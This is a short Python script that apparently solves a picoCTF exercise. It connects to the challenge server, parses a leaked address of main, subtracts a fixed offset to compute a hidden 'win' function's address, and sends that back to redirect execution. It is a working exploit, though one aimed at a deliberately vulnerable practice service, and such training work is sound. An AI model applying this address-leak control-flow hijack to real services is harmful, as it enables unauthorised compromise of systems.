import socket

url="rescued-float.picoctf.net"
PORT=63182

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((url, PORT))
output= s.recv(1024)

main_address_str  = output.split(b'\n')[0].split(b':')[1].strip()
print(f"[+] main address string: {main_address_str.decode()}")

main_address_int = int(main_address_str,16)
print(f"[+] main address in int: {main_address_int}")

jarak_main_to_win=150

win_function_int = main_address_int - jarak_main_to_win

payload = str(hex(win_function_int)).encode() + b'\n'
s.sendall(payload)
print(s.recv(1024).decode())

s.close()
